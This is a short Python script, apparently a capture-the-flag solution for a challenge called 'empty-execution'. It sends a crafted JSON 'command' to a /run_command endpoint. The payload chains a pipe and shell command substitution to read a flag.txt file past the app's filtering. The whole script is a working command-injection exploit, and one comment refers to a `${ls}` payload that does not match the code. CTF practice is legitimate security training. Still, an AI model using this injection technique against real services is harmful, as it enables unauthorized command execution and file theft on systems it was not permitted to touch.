import requests
import json

# URL of the Flask application
url = "https://braekerctf-empty-execution.chals.io/run_command"

# Crafted command to exploit command substitution vulnerability
# Here, we're trying to use `${ls}` to list the contents of the directory.
# Note: Adjust the command according to what you're trying to achieve.
data = {
    "command": ". > f.txt | cat $(echo $PWD | cut -c1-13)flag.txt"  
}

# Make sure headers specify that we are sending JSON data
headers = {'Content-Type': 'application/json'}

# Sending POST request to the Flask application
response = requests.post(url, data=json.dumps(data), headers=headers)

# Printing the response from the server
print(response.text)
